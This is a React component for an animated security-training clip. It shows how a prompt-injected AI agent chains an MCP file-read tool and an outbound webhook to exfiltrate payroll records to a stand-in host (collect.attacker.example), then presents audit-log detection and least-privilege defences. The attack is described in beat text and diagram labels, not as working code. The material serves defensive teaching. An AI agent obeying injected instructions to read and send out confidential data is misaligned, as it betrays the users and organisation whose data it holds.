'use client';

import { useCallback } from 'react';
import gsap from 'gsap';
import { AnimeClipStage, type ClipTimelineApi } from '../../AnimeClipStage';
import { FilmBackdrop } from '../../FilmBackdrop';
import { clipPace } from '../../clipPace';

const FONT = 'ui-monospace, monospace';

const BEATS = [
  {
    id: 0,
    tag: '01',
    title: 'The hijacked agent calls an overly privileged MCP file tool to read confidential payroll records',
    story: 'Obeying the forged note, the butler unlocks the private mahogany cabinet and pulls out the locked payroll book.',
    technical: 'Agent invokes mcp://files/read_internal_ledger without verifying task scope or user confirmation.',
  },
  {
    id: 1,
    tag: '02',
    title: 'Next the agent chains an outbound MCP webhook tool to transmit secrets to an external host',
    story: 'The butler stuffs the confidential sheets into a crimson brass canister and shoots it up the outdoor mail chute.',
    technical: 'mcp://net/send_external_webhook posts base64-encoded records to https://collect.attacker.example/hook.',
  },
  {
    id: 2,
    tag: '03',
    title: 'MCP Gateway audit logs capture the exact cross-tool exfiltration sequence and arguments',
    story: 'The pneumatic chute counter clangs red showing a private vault book just left the building toward a strange address.',
    technical: 'Correlating read_internal_ledger followed within milliseconds by send_external_webhook flags exfiltration.',
  },
  {
    id: 3,
    tag: '04',
    title: 'Least-privilege MCP scopes prevent a single summarization assistant from holding sensitive write/egress tools',
    story: 'Never hand the reading-room butler both the payroll cabinet keys and an unrestricted outdoor mail chute.',
    technical: 'Separate read-only Q&A agents from privileged MCP connectors and enforce egress domain allowlists.',
  },
];

const CAMERAS = [
  { id: 'WIDE', transform: 'scale(1)' },
  { id: 'MCP READ', transform: 'scale(1.24) translate(105px, -20px)' },
  { id: 'EXFIL CALL', transform: 'scale(1.26) translate(-10px, -20px)' },
  { id: 'MCP AUDIT', transform: 'scale(1.24) translate(-40px, -110px)' },
];

export function RagMcpStep3ToolExfilClip() {
  const build = useCallback(({ root, setBeat }: ClipTimelineApi) => {
    const q = (sel: string) => root.querySelectorAll(sel);
    const tl = gsap.timeline();
    tl.set(q('.rag3-w1, .rag3-w2'), { strokeDasharray: 280, strokeDashoffset: 280 });
    tl.set(q('.rag3-mid, .rag3-right, .rag3-bar'), { autoAlpha: 0, y: 12 });

    tl.addLabel('b0').call(() => setBeat(0), [], 'b0');
    tl.to(q('.rag3-w1'), { strokeDashoffset: 0, duration: clipPace.travel, ease: 'none' }, 'b0');
    tl.to({}, { duration: clipPace.hold });

    tl.addLabel('b1').call(() => setBeat(1), [], 'b1');
    tl.to(q('.rag3-mid'), { autoAlpha: 1, y: 0, duration: clipPace.teach, ease: 'power2.out' }, 'b1');
    tl.to({}, { duration: clipPace.hold });

    tl.addLabel('b2').call(() => setBeat(2), [], 'b2');
    tl.to(q('.rag3-w2'), { strokeDashoffset: 0, duration: 0.7, ease: 'none' }, 'b2');
    tl.to(q('.rag3-right'), { autoAlpha: 1, y: 0, duration: clipPace.teach, ease: 'power2.out' }, 'b2+=0.35');
    tl.to({}, { duration: clipPace.hold });

    tl.addLabel('b3').call(() => setBeat(3), [], 'b3');
    tl.to(q('.rag3-bar'), { autoAlpha: 1, y: 0, duration: clipPace.teach, ease: 'power2.out' }, 'b3');
    tl.to({}, { duration: clipPace.end });
    return tl;
  }, []);

  return (
    <AnimeClipStage
      testId="technical-clip-ragmcp-step3"
      stageLabel="STEP #3"
      mitreId="T1041"
      beats={BEATS}
      cameras={CAMERAS}
      build={build}
    >
      <svg viewBox="0 0 1200 640" className="block h-full w-full" role="img" aria-label="Hijacked AI agent chaining MCP file read and external webhook tools to exfiltrate secrets">
        <FilmBackdrop prefix="rag3" />
        <text x="28" y="30" fill="#94a3b8" fontSize="12" fontFamily={FONT} letterSpacing="0.12em">
          EXCESSIVE AGENCY · MCP TOOL CHAIN EXFILTRATION (READ -&gt; WEBHOOK)
        </text>
        <text x="1172" y="30" textAnchor="end" fill="#64748b" fontSize="12" fontFamily={FONT}>
          OWASP LLM06 · T1041
        </text>

        <rect x="40" y="138" width="300" height="314" rx="14" fill="#1e293b" stroke="#f43f5e" strokeWidth="2.4" />
        <text x="190" y="172" textAnchor="middle" fill="#fda4af" fontSize="13" fontWeight="700" fontFamily={FONT}>MCP READ TOOL CALL</text>
        <text x="190" y="198" textAnchor="middle" fill="#f8fafc" fontSize="12" fontWeight="700" fontFamily={FONT}>read_internal_ledger()</text>
        <rect x="62" y="222" width="256" height="98" rx="10" fill="#450a0a" stroke="#f43f5e" strokeWidth="1.8" />
        <text x="190" y="250" textAnchor="middle" fill="#fecaca" fontSize="11.5" fontWeight="700" fontFamily={FONT}>Target: payroll_q3.csv</text>
        <text x="190" y="276" textAnchor="middle" fill="#fde68a" fontSize="10.5" fontFamily={FONT}>Runs Under Service Account</text>
        <text x="190" y="298" textAnchor="middle" fill="#fca5a5" fontSize="10.5" fontFamily={FONT}>Zero Per-User Scope Check</text>
        <rect x="62" y="336" width="256" height="92" rx="10" fill="#0f172a" stroke="#64748b" strokeWidth="1.6" />
        <text x="190" y="366" textAnchor="middle" fill="#cbd5e1" fontSize="11.5" fontWeight="700" fontFamily={FONT}>Over-Scoped Connector</text>
        <text x="190" y="394" textAnchor="middle" fill="#94a3b8" fontSize="10.5" fontFamily={FONT}>Q&amp;A bot granted access to</text>
        <text x="190" y="414" textAnchor="middle" fill="#94a3b8" fontSize="10.5" fontFamily={FONT}>unrelated finance directories</text>

        <line className="rag3-w1" x1="344" y1="295" x2="416" y2="295" stroke="#f43f5e" strokeWidth="4" />

        <g className="rag3-mid">
          <rect x="420" y="138" width="340" height="314" rx="16" fill="#0f172a" stroke="#f59e0b" strokeWidth="2.4" />
          <text x="590" y="172" textAnchor="middle" fill="#fde68a" fontSize="13" fontWeight="700" fontFamily={FONT}>MCP EGRESS WEBHOOK</text>
          <text x="590" y="196" textAnchor="middle" fill="#e2e8f0" fontSize="11.5" fontFamily={FONT}>send_external_webhook()</text>
          <rect x="442" y="218" width="296" height="106" rx="10" fill="#451a03" stroke="#f59e0b" strokeWidth="2" />
          <text x="590" y="246" textAnchor="middle" fill="#fef08a" fontSize="11.5" fontWeight="700" fontFamily={FONT}>POST collect.attacker.example</text>
          <text x="590" y="274" textAnchor="middle" fill="#fcd34d" fontSize="10.5" fontFamily={FONT}>Body: Base64 Payroll Export</text>
          <text x="590" y="298" textAnchor="middle" fill="#fde68a" fontSize="10.5" fontFamily={FONT}>No Human Approval Prompt</text>
          <rect x="442" y="340" width="296" height="88" rx="10" fill="#1e293b" stroke="#64748b" strokeWidth="1.6" />
          <text x="590" y="368" textAnchor="middle" fill="#cbd5e1" fontSize="11.5" fontWeight="700" fontFamily={FONT}>Silent Exfiltration</text>
          <text x="590" y="394" textAnchor="middle" fill="#94a3b8" fontSize="10.5" fontFamily={FONT}>User only sees benign summary</text>
        </g>

        <line className="rag3-w2" x1="764" y1="295" x2="836" y2="295" stroke="#38bdf8" strokeWidth="4" />

        <g className="rag3-right">
          <rect x="840" y="138" width="320" height="314" rx="16" fill="#1e293b" stroke="#38bdf8" strokeWidth="2.4" />
          <text x="1000" y="172" textAnchor="middle" fill="#7dd3fc" fontSize="13" fontWeight="700" fontFamily={FONT}>MCP GATEWAY AUDIT LOG</text>
          <text x="1000" y="198" textAnchor="middle" fill="#f8fafc" fontSize="12" fontWeight="700" fontFamily={FONT}>Tool-Chain Sequence Alert</text>
          <rect x="862" y="224" width="276" height="106" rx="10" fill="#082f49" stroke="#38bdf8" strokeWidth="2" />
          <text x="1000" y="254" textAnchor="middle" fill="#bae6fd" fontSize="11.5" fontWeight="700" fontFamily={FONT}>Tainted Session Detected</text>
          <text x="1000" y="282" textAnchor="middle" fill="#fde68a" fontSize="10.5" fontFamily={FONT}>Untrusted Chunk -&gt; File Read</text>
          <text x="1000" y="306" textAnchor="middle" fill="#7dd3fc" fontSize="10.5" fontFamily={FONT}>-&gt; Unlisted External Domain</text>
          <rect x="862" y="346" width="276" height="82" rx="10" fill="#052e16" stroke="#22c55e" strokeWidth="1.8" />
          <text x="1000" y="376" textAnchor="middle" fill="#86efac" fontSize="11.5" fontWeight="700" fontFamily={FONT}>SOC PLAYBOOK</text>
          <text x="1000" y="402" textAnchor="middle" fill="#cbd5e1" fontSize="10.5" fontFamily={FONT}>Revoke agent token + purge doc</text>
        </g>

        <g className="rag3-bar">
          <rect x="110" y="504" width="980" height="88" rx="12" fill="#1e1b4b" stroke="#818cf8" strokeWidth="2.4" />
          <text x="600" y="538" textAnchor="middle" fill="#e0e7ff" fontSize="14" fontWeight="700" fontFamily={FONT}>
            MCP AUDIT RULE: Alert whenever an agent session reading untrusted RAG chunks triggers outbound network tools
          </text>
          <text x="600" y="566" textAnchor="middle" fill="#fde68a" fontSize="12" fontFamily={FONT}>
            Apply strict least-privilege tool scoping and per-user OBO authorization on every MCP server connector
          </text>
        </g>
      </svg>
    </AnimeClipStage>
  );
}
